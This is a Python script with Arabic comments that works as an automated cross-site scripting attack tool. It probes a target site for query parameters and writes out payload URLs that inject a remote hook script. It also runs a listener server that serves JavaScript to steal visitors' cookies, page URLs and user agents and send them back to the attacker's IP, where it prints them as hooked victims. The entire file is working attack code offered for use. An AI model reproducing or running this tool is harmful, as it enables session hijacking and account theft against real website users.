#!/usr/bin/env python3
import requests
import urllib.parse
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys  # ❗ ناقص هذا السطر

class XSSAutoExploit:
    def __init__(self, target_url, your_ip):
        self.target_url = target_url
        self.your_ip = your_ip
        self.hook_url = f"http://{your_ip}:8080/hook.js"  # ❗ صححت الأقواس
        self.victims = []
    
    def discover_parameters(self):
        """اكتشاف parameters تلقائياً"""
        common_params = ['q', 'search', 'query', 'id', 'page', 'name', 'email',
                        'username', 'message', 'comment', 'title', 'category']
        
        discovered = []
        for param in common_params:
            test_url = f"{self.target_url}?{param}=test"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    discovered.append(param)
                    print(f"[+] Found parameter: {param}")
            except:
                pass
        return discovered
    
    def generate_payloads(self, param):
        """توليد payloads تلقائية"""
        payloads = [
            f"<script src='{self.hook_url}'></script>",
            f"<img src=x onerror=\"var s=document.createElement('script');s.src='{self.hook_url}';document.head.appendChild(s)\">"
        ]
        return [f"{self.target_url}?{param}={urllib.parse.quote(payload)}" for payload in payloads]
    
    def auto_exploit(self):
        """استغلال تلقائي"""
        print(f"[*] Starting auto exploitation for: {self.target_url}")
        
        # اكتشاف parameters
        params = self.discover_parameters()
        if not params:
            print("[-] No parameters discovered")
            return
        
        # توليد روابط استغلال
        exploit_urls = []
        for param in params:
            exploit_urls.extend(self.generate_payloads(param))
        
        print(f"[+] Generated {len(exploit_urls)} exploit URLs")
        
        # حفظ الروابط في ملف
        with open("exploit_urls.txt", "w") as f:
            for url in exploit_urls:
                f.write(url + "\n")
        
        print("[+] Exploit URLs saved to exploit_urls.txt")
        return exploit_urls

class ExploitServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/hook.js':
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.end_headers()
            
            hook_script = f"""
            (function(){{
                var data = {{
                    url: window.location.href,
                    cookie: document.cookie,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                }};
                
                // إرسال البيانات
                var img = new Image();
                img.src = 'http://{self.server.exploiter.your_ip}:8080/log?data=' + encodeURIComponent(JSON.stringify(data));
            }})();
            """
            self.wfile.write(hook_script.encode())
        
        elif self.path.startswith('/log'):
            # معالجة البيانات المسروقة
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            
            if 'data' in params:
                victim_data = json.loads(params['data'][0])
                print(f"[!] VICTIM HOOKED: {self.client_address[0]}")
                print(f"    URL: {victim_data['url']}")
                print(f"    Cookies: {victim_data['cookie']}")
            
            self.send_response(200)
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # تعطيل الlogging

def start_exploitation(target_url, your_ip):
    """بدء الاستغلال التلقائي"""
    
    # إنشاء المستغل
    exploiter = XSSAutoExploit(target_url, your_ip)
    
    # تشغيل سيرفر الاستقبال
    class ExploitServerWrapper(HTTPServer):
        def __init__(self, *args, **kwargs):
            self.exploiter = exploiter
            super().__init__(*args, **kwargs)
    
    def run_server():
        server = ExploitServerWrapper(('0.0.0.0', 8080), ExploitServer)
        print(f"[+] Exploit server running on http://{your_ip}:8080")
        server.serve_forever()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # بدء الاستغلال التلقائي
    time.sleep(2)
    exploiter.auto_exploit()
    
    # إبقاء البرنامج شغال
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Exploitation stopped")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 xss_auto_exploit.py TARGET_URL YOUR_IP")
        print("Example: python3 xss_auto_exploit.py https://example.com/search?q=test 192.168.1.100")
        sys.exit(1)
    
    target_url = sys.argv[1]
    your_ip = sys.argv[2]
    
    print("[*] XSS Auto Exploitation Tool Started")
    start_exploitation(target_url, your_ip)